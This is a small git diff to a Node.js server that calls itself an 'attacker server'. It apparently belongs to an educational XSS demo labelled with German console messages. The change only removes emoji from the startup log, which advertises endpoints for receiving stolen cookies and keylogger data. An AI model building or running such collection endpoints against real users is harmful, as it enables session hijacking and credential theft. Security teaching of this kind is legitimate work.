@@ -69,14 +69,14 @@ app.get('/keys', (req, res) => {
 app.listen(port, () => {
     console.clear();
     console.log('\n' + '═'.repeat(70));
-    console.log('  🚀 ATTACKER SERVER GESTARTET');
+    console.log('ATTACKER SERVER GESTARTET');
     console.log('═'.repeat(70));
-    console.log('\n📡 Server läuft auf:  http://localhost:' + port);
-    console.log('\n📋 Verfügbare Endpoints:');
+    console.log('\nServer läuft auf:  http://localhost:' + port);
+    console.log('\nVerfügbare Endpoints:');
     console.log('   GET  /steal?c=<cookies>       - Cookie-Diebstahl');
     console.log('   GET  /keys?d=<keys>&u=<url>   - Keylogger');
     console.log('\n' + '═'.repeat(70));
-    console.log('⚠️  NUR FÜR BILDUNGSZWECKE!');
+    console.log('NUR FÜR BILDUNGSZWECKE!');
     console.log('═'.repeat(70));
-    console.log('\n💡 Warte auf eingehende Angriffe...\n');
+    console.log('\nWarte auf eingehende Angriffe...\n');
 });
